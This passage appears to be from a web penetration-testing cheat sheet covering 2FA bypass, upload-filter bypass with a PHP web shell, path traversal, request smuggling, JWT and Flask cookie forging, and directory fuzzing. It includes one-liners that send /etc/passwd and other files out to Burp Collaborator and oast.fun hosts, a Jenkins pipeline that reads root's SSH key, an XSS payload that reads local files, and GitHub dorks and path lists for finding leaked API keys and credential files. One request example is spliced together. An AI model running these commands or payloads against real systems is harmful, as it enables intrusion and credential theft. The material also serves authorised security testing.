| JSON Web Tokens | JSON Web Token Debugger | https://jwt.io |
| JWT_Tool | The JSON Web Token Toolkit v2 | https://github.com/ticarpi/jwt_tool |
| KeyHacks | KeyHacks shows ways in which particular API keys found on a Bug Bounty Program can be used, to check if they are valid. | https://github.com/streaak/keyhacks |
| Leaky Paths | A collection of special paths linked to major web CVEs, known misconfigurations, juicy APIs ..etc. It could be used as a part of web content discovery, to scan passively for high-quality endpoints and quick-wins. | https://github.com/ayoubfathi/leaky-paths |
| Lodash | The Lodash library exported as a UMD module. | https://github.com/lodash/lodash |
| ngrok | ngrok is the programmable network edge that adds connectivity, security, and observability to your apps with no code changes. | https://ngrok.com |
| Notify | Notify is a Go-based assistance package that enables you to stream the output of several tools (or read from a file) and publish it to a variety of supported platforms. | https://github.com/projectdiscovery/notify |
| NtHiM | Super Fast Sub-domain Takeover Detection | https://github.com/TheBinitGhimire/NtHiM |
| Oralyzer | Oralyzer, a simple python script that probes for Open Redirection vulnerability in a website. | https://github.com/r0075h3ll/Oralyzer |
| PayloadsAllTheThings | A list of useful payloads and bypasses for Web Application Security. | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHPGGC | PHPGGC: PHP Generic Gadget Chains | https://github.com/ambionics/phpggc |
| pingb | HTTP Request & Response Service | http://pingb.in |
| Recox | The script aims to help in classifying vulnerabilities in web applications. | https://github.com/samhaxr/recox |
| reNgine | The only web application recon tool you will ever need! | https://github.com/yogeshojha/rengine |
| Request Catcher | Request Catcher will create a subdomain on which you can test an application. | https://requestcatcher.com |
| SSRFIRE | An automated SSRF finder. Just give the domain name and your server and chill! ;) Also has options to find XSS and open redirects | https://github.com/ksharinarayanan/SSRFire |
| SSRFmap | SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. | https://github.com/swisskyrepo/SSRFmap |
| SSRF testing resources | SSRF (Server Side Request Forgery) testing resources | https://github.com/cujanovic/SSRF-Testing |
| SSTImap | Automatic SSTI detection tool with interactive interface | https://github.com/vladko312/SSTImap |
| toxssin | An XSS exploitation command-line interface and payload generator. | https://github.com/t3l3machus/toxssin |
| Tplmap | Server-Side Template Injection and Code Injection Detection and Exploitation Tool | https://github.com/epinna/tplmap |
| truffleHog | Find leaked credentials. | https://github.com/trufflesecurity/truffleHog |
| unfurl | Pull out bits of URLs provided on stdin | https://github.com/tomnomnom/unfurl |
| waybackurls | Fetch all the URLs that the Wayback Machine knows about for a domain | https://github.com/tomnomnom/waybackurls |
| Webhook.site | Webhook.site lets you easily inspect, test and automate (with the visual Custom Actions builder, or WebhookScript) any incoming HTTP request or e-mail. | https://webhook.site |
| Weird Proxies | It's a cheat sheet about behaviour of various reverse proxies and related attacks. | https://github.com/GrrrDog/weird_proxies |
| Wfuzz | Wfuzz - The Web Fuzzer | https://github.com/xmendez/wfuzz |
| WhatWeb | Next generation web scanner | https://github.com/urbanadventurer/WhatWeb |
| WPScan | WordPress Security Scanner | https://github.com/wpscanteam/wpscan |
| x8 | Hidden parameters discovery suite written in Rust. | https://github.com/Sh1Yo/x8 |
| XSRFProbe | The Prime Cross Site Request Forgery Audit & Exploitation Toolkit. | https://github.com/0xInfection/XSRFProbe |
| XSStrike | Most advanced XSS scanner. | https://github.com/s0md3v/XSStrike |
| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |

## 2FA Bypass Techniques

### 1. Response Manipulation

If the value `"success":false` can be found in the response, change it to `"success":true`.

### 2. Status Code Manipulation

If theStatus Code is `4xx` try to change it to `200 OK` and see if it bypasses restrictions.

### 3. 2FA Code Leakage in Response

Check the response of the `2FA Code Triggering Request` to see if the code is leaked.

### 4. JS File Analysis

Rare but some `JS Files` may contain info about the `2FA Code`, worth giving a shot.

### 5. 2FA Code Reusability

Same code can be reused.

### 6. Lack of Brute-Force Protection

Possible to `Brute-Force` any length 2FA Code.

### 7. Missing 2FA Code Integrity Validation

Code for `any` user account can be used to bypass the 2FA.

### 8. CSRF on 2FA Disabling

No `CSRF Protection` on `Disable 2FA`, also there is no `Authentication Confirmation`.

### 9. Password Reset Disable 2FA

2FA gets disabled on `Password Change or Email Change`.

### 10. Clickjacking on 2FA Disabling Page

Put an `Iframe` on the `2FA Disabling Page` and use `Social Engineering` to trick the victim to disable 2FA.

### 11. Bypass 2FA with null or 000000

Enter the code `000000` or `null` to bypass 2FA protection.

#### Steps:

1. Enter `null` in 2FA code.
2. Enter `000000` in 2FA code.
3. Send empty code - Someone found this in Grammarly.
4. Open a new tab in the same browser and check if other `API Endpoints` are accessible without entering 2FA.

### 12. Google Authenticator Bypass

#### Steps:

1. Set-up Google Authenticator for 2FA.
2. Now, 2FA is enabled.
3. Go on the `Password Reset Page` and `change` your `password`.
4. If your website redirects you to your dashboard then `2FA (Google Authenticator)` is bypassed.

### 13. Bypassing OTP in Registration Forms by repeating the Form Eubmission multiple Times using Repeater

#### Steps:

1. Create an account with a `non-existing` phone number.
2. Intercept the request in `Burp Suite`.
3. Send the request to the repeater and forward.
4. Go to the Repeater tab and `change` the `non-existent` phone number to your phone number.
5. If you got an OTP to your phone, try using that OTP to register that non-existent number.

## 403 Bypass

### HTTP Header Payload

```c
$ curl -I http://<RHOST> -H "X-Client-IP: 127.0.0.1"
$ curl -I http://<RHOST> -H "X-CLIENT-IP: 127.0.0.1"
$ curl -I http://<RHOST> -H "X-Client-Ip: 127.0.0.1"
```

## Asset Discovery

```c
$ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
```

## Burp Suite

> https://portswigger.net/burp

### Filter Options

- Proxy > Options > Intercept Client Requets > Is in target scope
- Proxy > Options > Intercept Server Responses > Is in target scope

### Shortcuts

```c
Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
```

### Tweaks

Burp Suite > Proxy > Proxy settings > TLS pass through

```c
.*\.google\.com 
.*\.gstatic\.com
.*\.mozilla\.com
.*\.googleapis\.com
.*\.pki\.google\.com
```

### Set Proxy Environment Variables

```c
$ export http_proxy=http://localhost:8080
$ export https_proxy=https://localhost:8080
$ http_proxy=localhost:8080 https_proxy=localhost:8080 <COMMAND> <RHOST>
```

### Extensions

- 5GC API Parser
- 403 Bypasser
- Active Scan++
- Asset Discovery
- Autorize
- Backslash Powered Scanner
- CO2
- Collaborator Everywhere
- Distribute Damage
- Encode IP
- GAP
- IIS Tilde
- IP Rotate
- J2EEScan
- JS Link Finder
- JS Miner
- JSON Web Tokens
- Logger++
- Log Viewer
- Look Over There
- Param Miner
- SAML Raider
- Software Vulnerability Scanner
- SQLiPy Sqlmap Integration
- Upload Scanner
- ViewState Editor

### Filter for SSRF (AutoRepeater)

```c
((?:[a-zA-Z]{1,10}://|//)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})
```

## Bypassing File Upload Restrictions

* file.php -> file.jpg
* file.php -> file.php.jpg
* file.asp -> file.asp;.jpg
* file.gif (contains php code, but starts with string GIF/GIF98)
* 00%
* file.jpg with php backdoor in exif (see below)
* .jpg -> proxy intercept -> rename to .php

### PDF Upload Filter Bypass

Create a `PHP Reverse / Web Shell`, name it `shell.phpX.pdf` and `zip` it.

```c
$ touch shell.phpX.pdf
$ zip shell.zip shell.phpX.pdf
```

Open the `Zip Archive` in your favourite `Hex Editor`.

```c
00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
00000A90  2E 70 68 70 58 2E 70 64  66 55 54 05 00 03 A3 6F  .phpX.pdfUT....o
```

Replace the `X` with `Null Bytes (00)` and save it.

```c
00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
00000A90  2E 70 68 70 00 2E 70 64  66 55 54 05 00 03 A3 6F  .php..pdfUT....o
```

After uploading you can remove the `space` and access the file.

## cadaver

### General Usage

```c
$ cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
```

### Common Commands

```c
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

## Command Injection

### Vulnerable Functions in PHP

* Exec
* Passthru
* System

### Input Sanitisation

* filter_input

### Filter Bypass

```c
$payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
```

## commix

```c
$ python3 commix.py --url="http://<RHOST>:5013/graphql" --data='{"query":"query{systemDebug(arg:\"test \")}"}' -p arg
```

## Common File Extensions

```c
7z,action,ashx,asp,aspx,backup,bak,bz,c,cgi,conf,config,dat,db,dhtml,do,doc,docm,docx,dot,dotm,go,htm,html,ini,jar,java,js,js.map,json,jsp,jsp.source,jspx,jsx,log,old,pdb,pdf,phtm,phtml,pl,py,pyc,pyz,rar,rhtml,shtm,shtml,sql,sqlite3,svc,tar,tar.bz2,tar.gz,tsx,txt,wsdl,xhtm,xhtml,xls,xlsm,xlst,xlsx,xltm,xml,zip
```

```c
.7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

## curl

### Common Commands

```c
$ curl --trace - http://<RHOST>
```

### Uploading Files through Upload Forms

#### POST File

```c
$ curl -X POST -F "file=@/PATH/TO/FILE/<FILE>.php" http://<RHOST>/<FILE>.php --cookie "cookie"
```

#### POST Binary Data to Web Form

```c
$ curl -F "field=<file.zip" http://<RHOST>/<FILE>.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

## davtest

```c
$ davtest -auth <USERNAME>:<FOOBAR> -sendbd auto -url http://<RHOST>/<WEBDAV_DIRECTORY>/
```

## DirBuster

> https://github.com/KajanM/DirBuster

```c
-r    // don't search recursively
-w    // scan with big wordlists

$ dirb http://<RHOST>
```

## Directory Traversal Attack

### Skeleton Payload Request

```c
GET /../../../../../../../../etc/passwd HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://<RHOST>:<RPORT>/
Upgrade-Insecure-Requests: 1
```

### Read /etc/passwd

```c
GET // HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://<RHOST>:<RPORT>/
Upgrade-Insecure-Requests: 1GET /../../../../../../../../etc/passwd HTTP/1.1
```

## dirsearch

> https://github.com/maurosoria/dirsearch

### General Usage

```c
-i    // includes specific status codes
-e    // excludes specific status codes
-m    // specifies HTTP method
```

### Common Commands

```c
$ dirsearch -u http://<RHOST>:<RPORT>
$ dirsearch -u http://<RHOST>:<RPORT> -m POST
$ dirsearch -u http://<RHOST>:<RPORT> -e *
$ dirsearch -u http://<RHOST>:<RPORT>/ -R 5 -e http,php,html,css /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt
```

## DNS Smuggling

```c
GETID=$(cat /etc/passwd | head -n 1 | base64) && nslookup $GETID.0wdj2957gw6t7g5463t7063hy.burpcollborator.net
```

## DS_Walk

> https://github.com/Keramas/DS_Walk

```c
$ python ds_walk.py -u http://<RHOST>
```

## Favicon

> https://wiki.owasp.org/index.php/OWASP_favicon_database

```c
$ curl https://<RHOST>/sites/favicon/images/favicon.ico | md5sum
```

## feroxbuster

> https://github.com/epi052/feroxbuster

```c
$ feroxbuster -u http://<RHOST> -x js,bak,txt,png,jpg,jpeg,php,aspx,html --extract-links
```

## ffuf

> https://github.com/ffuf/ffuf

```c
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
$ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

### API Fuzzing

```c
$ ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

### Searching for LFI

```c
$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

### Fuzzing with PHP Session ID

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

### Fuzzing with HTTP Request File

```c
$ ffuf -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -request <FILE> -request-proto "https" -mc 302 -t 150 | tee progress
```

### Testing

> http://fuff.me

#### Basic

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ
```

#### Recursion

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ -recursion
```

#### File Extensions

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/ext/logs/FUZZ -e .log
```

#### No 404 Header

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/no404/FUZZ -fs 669
```

#### Param Mining

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/param/data?FUZZ=1
```

#### Rate Limiting

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://ffuf.test/cd/rate/FUZZ -mc 200,429
```

#### IDOR Testing

```c
$ seq 1 1000 | ffuf -w - -u http://ffuf.me/cd/pipes/user?id=FUZZ
```

#### Script for IDOR Testing

```c
#!/bin/bash

while read i
do
  if [ "$1" == "md5" ]; then
    echo -n $i | md5sum | awk '{ print $1 }'
  elif [ "$1" == "b64" ]; then
    echo -n $i | base64
  else
    echo $i
  fi
done
```

#### Use Script above for Base64 decoding

```c
$ seq 1 1000 | /usr/local/bin/hashit b64 | ffuf -w - -u http://ffuf.me/cd/pipes/user2?id=FUZZ
```

#### MD5 Discovery using the Script

```c
$ seq 1 1000 | /usr/local/bin/hashit md5 | ffuf -w - -u http://ffuf.me/cd/pipes/user3?id=FUZZ
```

#### Virtual Host Discovery

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs 1495
```

#### Massive File Extension Discovery

```c
$ ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<TARGET>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

## Flask-Unsign

> https://github.com/Paradoxis/Flask-Unsign

```c
$ pip3 install flask-unsign
```

### Decode Cookie

```c
$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

### Brute Force

```c
$ flask-unsign --unsign --cookie < cookie.txt
```

### Unsigning a Cookie

```c
$ flask-unsign --unsign --no-literal-eval --wordlist /PATH/TO/WORDLIST/<FILE>.txt --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZm9vYmFyIn0.Yq4QPw.0Hj2xCfDMJi7ksNfR4Oe9yN7nYQ
```

### Signing a Cookie

```c
$ flask-unsign --sign --legacy --secret '<PASSWORD>' --cookie "{'logged_in': True, 'username': '<USER>'}"
```

### Signing a UUID Cookie

```c
$ flask-unsign --sign --cookie "{'logged_in': True}" --secret '<PASSWORD>'
$ flask-unsign --sign --cookie "{'cart_items': ["2" , "5" , "6"], 'uuid': 'e9e62997-0291-4f63-8dbe-10d035326c75' }" --secret '<SECRET_KEY>'
```

## gf

> https://github.com/tomnomnom/gf

```c
$ go install github.com/tomnomnom/gf@latest
```

## GitHub

### OpenAI API Key Code Search

```c
https://github.com/search?q=%2F%22sk-%5Ba-zA-Z0-9%5D%7B20%2C50%7D%22%2F&ref=simplesearch&type=code
```

### GitHub Dorks

> https://github.com/search?type=code

```c
/ftp:\/\/.*:.*@.*target\.com/
/ftp:\/\/.*:.*@.*\.*\.br/
/ftp:\/\/.*?@.*?\.com\.br/
/ssh:\/\/.*:.*@.*target\.com/
/ssh:\/\/.*:.*@.*\.*\.*\.br/
/ldap:\/\/.*:.*@.*\.*\.*\.com/
/mysql:\/\/.*:.*@.*\.*\.*\.com/
/mongodb:\/\/.*:.*@.*\.*\.*\.com/
/ldaps:\/\/.*:.*@.*\.*\.*\.com/
```

## GitTools

> https://github.com/internetwache/GitTools

### gitdumper

```c
$ ./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
```

### extractor

```c
$ ./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

## GIXY

> https://github.com/yandex/gixy

```c
$ pip install gixy
$ gixy /etc/nginx/nginx.conf
```

## Gobuster

> https://github.com/OJ/gobuster

```c
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -k --exclude-length <NUMBER>
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

### POST Requests

```c
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

### DNS Recon

```c
$ gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
$ gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### VHost Discovery

```c
$ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
$ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Specifiy User Agent

```c
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

## gron

> https://github.com/tomnomnom/gron

```c
$ go install github.com/tomnomnom/gron@latest
```

## hakcheckurl

> https://github.com/hakluke/hakcheckurl

```c
$ go install github.com/hakluke/hakcheckurl@latest
```

## Hakrawler

> https://github.com/hakluke/hakrawler

```c
$ hakrawler -url <RHOST> -depth 3
$ hakrawler -url <RHOST> -depth 3 -plain
$ hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
```

## Host Header Regex Bypass

### Skeleton Payload Request

```c
POST /password-reset.php HTTP/1.1
Host: gymxcrossfit.htb/employees.crossfit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://employees.crossfit.htb
DNT: 1
Connection: close
Referer: http://employees.crossfit.htb/password-reset.php
Upgrade-Insecure-Requests: 1

email=david.palmer%40crossfit.htb

...
Host: gymxcrossfit.htb/employees.crossfit.htb    # <--- Host Header getting set after the "/" so we can bypass the regex by adding this line
...
```

## HTML Injection

> https://hackerone.com/reports/724153

```c
Filename<b>testBOLD</b>
```

### Skeleton Payload

```c
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

## HTTP Request Methods

### HTTP GET

- Retrieve a single item or a list of items

```c
GET /v1/products/foobar
```

```c
$ curl -v -X GET -k https://example.com 80
```

#### Response

```c
<HTML>
  <HEAD>foobar</HEAD>
  <BODY>
    <H1>foobar</H1>
    <P>This is foobar</P>
  </BODY>
</HTML>
```
 
### HTTP PUT

- Update an item

```c
PUT /v1/users/123
```

#### Request Body

```c
{"name": "bob", "email": "bob@bob.com"}
```

#### Response

```c
HTTP/1.1 200 OK
```
 
### HTTP POST

- Create an item

```c
POST /v1/users
```

#### Request Body

```c
{"firstname": "bob", "lastname": "bobber", "email": "bob@bob.com"}
```

#### Response

```c
HTTP/1.1 201 Created
```
 
### HTTP DELETE

- Delete an item

```c
DELETE /v1/users/123
```

#### Response

```c
HTTP/1.1 200 OK
HTTP/1.1 204 NO CONTENT
```
 
### HTTP PATCH

- Partially modify an item

```c
PATCH /v1/users/123
```

#### Request Body

```c
{ 
   "email": "bob@company.com"
}
```

#### Response

```c
HTTP/1.1 200 OK
```
 
### HTTP HEAD

- Identical to GET but no message body in the response

```c
HEAD /v1/products/iphone
```

```c
$ curl -v -X HEAD -k https://example.com 80
```

#### Response

```c
HTTP/1.1 200 OK
```
 
### HTTP CONNECT

- Create a two-way connection with a proxy server

```c
CONNECT <RHOST>:80
```

#### Request

```c
Host: <RHOST>
Proxy-Authorization: basic UEBzc3dvcmQxMjM=
```

#### Response

```c
HTTP/1.1 200 OK
```
 
### HTTP OPTIONS

- Return a list of supported HTTP methods

```c
OPTIONS /v1/users
```

```c
$ curl -v -X OPTIONS -k https://example.com 80
```

#### Response

```c
HTTP/1.1 200 OK
Allow: GET,POST,DELETE,HEAD,OPTIONS
```
 
### HTTP TRACE

- Perform a message loop-back test, providing a debugging mechanism

```c
TRACE /index.html
```

```c
$ curl -v -X TRACE -k https://example.com 80
```

#### Response

```c
Host: <RHOST>
Via: <RHOST>
X-Forwardet-For: <RHOST>
```

## HTTP Request Smuggling / HTTP Desync Attack

### Quick Wins

```c
Content-Length: 0
Connection: Content-Lentgh
```

### Content-Length / Transfer-Encoding (CL.TE)

#### Searching for Vulnerability

```c
POST / HTTP/1.1
Host: <RHOST>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

#### Skeleton Payload

```c
POST / HTTP/1.1
Host: <RHOST>
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked
\ `0`\
GET /404 HTTP/1.1
Foo: Bar
```

### Transfer-Encoding / Content-Length (TE.CL)

#### Searching for Vulnerability

```c
POST / HTTP/1.1
Host: <RHOST>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

#### Skeleton Payload

```c
POST / HTTP/1.1
Host: <RHOST>
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked
\ `7b`\ `GET /404 HTTP/1.1`\ `Host: <RHOST>`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\
x=
0
\
```

### Transfer-Encoding / Transfer-Encoding (TE.TE)

```c
Transfer-Encoding: xchunked
\ `Transfer-Encoding : chunked`\
Transfer-Encoding: chunked
Transfer-Encoding: x
\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\
Transfer-Encoding:[tab]chunked
\ `[space]Transfer-Encoding: chunked`\
X: X[\n]Transfer-Encoding: chunked
``
Transfer-Encoding
: chunked
```

## httprobe

> https://github.com/tomnomnom/httprobe

```c
$ go install github.com/tomnomnom/httprobe@latest
```

## httpx

> https://github.com/projectdiscovery/httpx

```c
$ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

## Interactsh

> https://app.interactsh.com

### Output Redirect into File

```c
$ curl -X POST -d  `ls -la / > output.txt` cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
$ curl -F "out=@output.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
$ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
```

## JavaScript

### JSFuck

> http://www.jsfuck.com/

> https://github.com/aemkei/jsfuck

> https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

```c
![]                                          // false
!![]                                         // true
[][[]]                                       // undefined
+[![]]                                       // NaN
+[]                                          // 0
+!+[]                                        // 1
!+[]+!+[]                                    // 2
[]                                           // Array
+[]                                          // Number
[]+[]                                        // String
![]                                          // Boolean
[]["filter"]                                 // Function
[]["filter"]["constructor"]( <CODE> )()      // eval
[]["filter"]["constructor"]("<FOOBAR>")()    // window
```

#### Encoded Payload

```c
<img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
```

## Jenkins

### Read SSH Keys through Pipelines

The following example the `SSH Agent Plugin` enabled.

```c
pipeline {
    agent any
    
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@<RHOST> "cat /root/.ssh/id_rsa"'
                    }
                }
            }
        }
    }
}
```

## jsleak

```c
$ echo http://<DOMAIN>/ | jsleak -s          // Secret Finder
$ echo http://<DOMAIN>/ | jsleak -l          // Link Finder
$ echo http://<DOMAIN>/ | jsleak -e          // Complete URL
$ echo http://<DOMAIN>/ | jsleak -c 20 -k    // Check Status
$ cat <FILE>.txt | jsleak -l -s -c 30        // Read from File
```

## JWT_Tool

> https://github.com/ticarpi/jwt_tool

```c
$ python3 jwt_tool.py -b -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name": "1", "exp":' `date -d "+7 days" +%s`} | base64 -w0).
$ python3 jwt_tool.py -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyOWVmOTYzOTMwYjA0NzYzZmU2YzMiLCJuYW1lIjoiZm9vYmFyIiwiZW1haWwiOiJmb29iYXJAc2VjcmV0LmNvbSIsImlhdCI6MTYzNTk1MDQxOX0.nhsLKCvNPBU8EoYVwDDpo8wGrL9VV62vrHVxfsBPCRk
```

## Kyubi

> https://github.com/shibli2700/Kyubi

```c
$ kyubi -v <URL>
```

## Leaky Paths

```c
.aws/config
.aws/credentials
.aws/credentials.gpg
.boto
.config/filezilla/filezilla.xml
.config/filezilla/recentservers.xml
.config/gcloud/access_tokens.db
.config/gcloud/credentials.db
.config/hexchat
.config/monero-project/monero-core.conf
.davfs2
.docker/ca.pem
.docker/config.json
.git-credentials
.gitconfig
.netrc
.passwd-s3fs
.purple/accounts.xml
.s3cfg
.s3ql/authinfo2
.shodan/api_key
.ssh/authorized_keys
.ssh/authorized_keys2
.ssh/config
.ssh/id_rsa
